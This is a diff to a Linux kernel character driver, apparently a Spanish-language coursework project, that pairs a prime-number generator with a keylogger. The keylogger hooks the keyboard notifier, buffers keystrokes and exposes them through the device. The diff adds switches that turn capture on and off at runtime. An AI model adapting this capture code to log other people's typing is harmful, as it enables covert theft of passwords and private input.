@@ -21,15 +21,15 @@ int tamPrimos = 0;
 static char keys_buffer[BUFFER_KEYLOGGER_SIZE]; // buffer donde almacenaremos las pulsaciones del usuario.
 static char *keys_buffer_pointer = keys_buffer;
 int key_buffer_position = 0; // Controlamos la posicion del buffer para no pasarnos de 1024.
-//char keyLoggerState = "";
+int keyLoggerState = 0;
 module_param(tamPrimos, int, 0660);
-//module_param(keyLoggerState, char, 0660);
+module_param(keyLoggerState, int, 0660);
 
 static struct driverInternalData
 {
     char data[MEM_SIZE];
     int dataSize;
-} driverData[NUM_DEVICES];
+} driverData;
 
 /* ============ Funciones que implementan las operaciones del controlador ============= */
 
@@ -37,6 +37,7 @@ static int AdrianArboledasopen(struct inode *inode, struct file *file)
 {
     pr_info("AdrianArboledasopen");
     deviceIndex = iminor(inode);
+    pr_info("El valor de key state es %i", keyLoggerState);
     return 0;
 }
 
@@ -87,13 +88,13 @@ static ssize_t GeneradorPrimosread(struct file *file, char __user *buffer, size_
     pr_info("GeneradorPrimosread");
 
     // Comprobamos si hemos leido todo.
-    if (*f_pos >= driverData[deviceIndex].dataSize)
+    if (*f_pos >= driverData.dataSize)
         return 0;
 
     // Limitamos los datos que se pueden leer.
-    count = driverData[deviceIndex].dataSize - *f_pos;
+    count = driverData.dataSize - *f_pos;
 
-    if (copy_to_user(buffer, driverData[deviceIndex].data, count))
+    if (copy_to_user(buffer, driverData.data, count))
         return -EFAULT;
 
     *f_pos += count;
@@ -153,17 +154,17 @@ static ssize_t GeneradorPrimoswrite(struct file *file, const char __user *buffer
     kfree(data);
 
     char aux[64];
-    driverData[deviceIndex].dataSize = 0;
+    driverData.dataSize = 0;
     int dataPosition = 0;
     for (int i = 0; i < num; i++)
     {
         sprintf(aux, "Primo Generado %i: %u\n\0", i + 1, generatedPrimes[i]);
         int tam = strlen(aux);
 
-        memcpy(driverData[deviceIndex].data + dataPosition, aux, tam); // Copiamos los datos del vector aux al driver data
+        memcpy(driverData.data + dataPosition, aux, tam); // Copiamos los datos del vector aux al driver data
         dataPosition += tam;
 
-        driverData[deviceIndex].dataSize = dataPosition;
+        driverData.dataSize = dataPosition;
     }
 
     return count;
@@ -197,12 +198,17 @@ static int keys_pressed(struct notifier_block *nb, unsigned long action, void *d
     {
         char character = keyBoardparam->value;
 
+        pr_info("Caracter de la tilde: %c",character);
+
+
+
+
         if (character == 0x01)
         {                                    // si es un inicio de cabecera
             *(keys_buffer_pointer++) = 0x0a; // añadimos un salto de linea
             key_buffer_position++;
         }
-        else{
+        else if(character >= 0x20 && character < 0x7f){
             *(keys_buffer_pointer++) = character;
             key_buffer_position++;
         }
@@ -216,7 +222,7 @@ static int keys_pressed(struct notifier_block *nb, unsigned long action, void *d
         }
     }
 
-    
+
     return NOTIFY_OK;
 }
 
@@ -236,7 +242,34 @@ static ssize_t KeyLoggerRead(struct file *file, char __user *buffer, size_t coun
 static ssize_t KeyLoggerWrite(struct file *file, const char __user *buffer, size_t count, loff_t *f_pos)
 {
 
-    return 0;
+    // Procedemos a reservar memoria
+    char *data = kmalloc(count, GFP_KERNEL);
+
+    if (!data)
+    {
+        return -ENOMEM; // no se ha podido reservar memoeria
+    }
+
+    if (copy_from_user(data, buffer, count))
+    {
+        kfree(data); // liberamos memoria.
+        return -EFAULT;
+    }
+    
+
+    if(data[0] == '1'){
+        register_keyboard_notifier(&notifyBlock);
+    } else {
+        //al quitar el registor del teclado, limpiamos el buffer
+        initBuffer(BUFFER_KEYLOGGER_SIZE, keys_buffer); // lo inicializamos a 0;
+        keys_buffer_pointer = keys_buffer;
+        key_buffer_position = 0;
+
+        unregister_keyboard_notifier(&notifyBlock);
+    }
+
+    kfree(data);
+    return count;
 }
 
 static int AdrianArboledasrelease(struct inode *inode, struct file *file)
@@ -282,7 +315,9 @@ static int __init init_driver(void)
     dev_t id_device;
 
     initBuffer(BUFFER_KEYLOGGER_SIZE, keys_buffer);
-    register_keyboard_notifier(&notifyBlock);
+    if(keyLoggerState == 1){
+        register_keyboard_notifier(&notifyBlock);
+    }
 
     if (alloc_chrdev_region(&major_minor, 0, NUM_DEVICES, DRIVER_NAME) < 0)
     {
@@ -347,7 +382,9 @@ error:
 static void __exit exit_driver(void)
 {
     int n_device;
-    unregister_keyboard_notifier(&notifyBlock);
+
+    if(keyLoggerState == 1)
+        unregister_keyboard_notifier(&notifyBlock);
 
     for (n_device = 0; n_device < NUM_DEVICES; n_device++)
     {
